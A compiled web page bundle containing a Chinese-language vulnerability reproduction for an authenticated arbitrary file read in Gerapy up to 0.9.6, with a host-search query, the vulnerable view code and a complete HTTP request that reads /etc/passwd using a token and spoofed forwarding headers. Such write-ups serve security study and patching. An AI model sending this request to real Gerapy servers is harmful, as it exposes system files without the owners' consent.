import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const d={},t=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>Gerapy gerapy/server/core/views.py 中的 project_file_read 方法存在任意文件读取，攻击者登录后台后发送特定的请求包即可利用漏洞</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Gerapy &lt;= 0.9.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>title=&quot;Gerapy&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241452469.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>出现漏洞的文件为 <code>gerapy/server/core/views.py</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241453657.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>@api_view([&#39;POST&#39;])
@permission_classes([IsAuthenticated])
def project_file_read(request):
    &quot;&quot;&quot;
    get content of project file
    :param request: request object
    :return: file content
    &quot;&quot;&quot;
    if request.method == &#39;POST&#39;:
        data = json.loads(request.body)
        path = join(data[&#39;path&#39;], data[&#39;label&#39;])
        # binary file
        with open(path, &#39;rb&#39;) as f:
            return HttpResponse(f.read().decode(&#39;utf-8&#39;))
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>参数 path 和 label 都为用户可控变量，登录后构造请求包</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /api/project/file/read HTTP/1.1
Host: 
Content-Length: 35
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

{&quot;path&quot;:&quot;/etc/&quot;,
&quot;label&quot;:&quot;passwd&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241453910.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15),s=[t];function r(l,c){return i(),a("div",null,s)}const v=e(d,[["render",r],["__file","Gerapy read 后台任意文件读取漏洞.html.vue"]]);export{v as default};
